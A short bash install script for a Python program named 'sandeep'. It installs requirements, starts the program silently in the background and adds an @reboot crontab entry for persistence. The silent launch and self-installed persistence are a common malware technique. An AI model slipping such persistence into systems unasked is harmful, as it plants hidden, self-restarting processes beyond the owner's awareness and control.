#!/bin/bash

echo "[+] Installing sandeep..."

cd "$(dirname "$0")"

if ! command -v python3 &>/dev/null; then
    echo "[X] Python3 is not installed."
    exit 1
fi

echo "[+] Installing Python requirements..."
python3 -m pip install --upgrade pip
python3 -m pip install -r requirements.txt

chmod +x sandeep.py

echo "[+] Starting sandeep..."
nohup python3 sandeep.py > /dev/null 2>&1 &

echo "[+] Setting up persistence..."
CRON_CMD="@reboot nohup python3 $(pwd)/sandeep.py > /dev/null 2>&1 &"
( crontab -l 2>/dev/null | grep -v -F "$CRON_CMD" ; echo "$CRON_CMD" ) | crontab -

echo "[✅] sandeep is now running in the background with persistence!"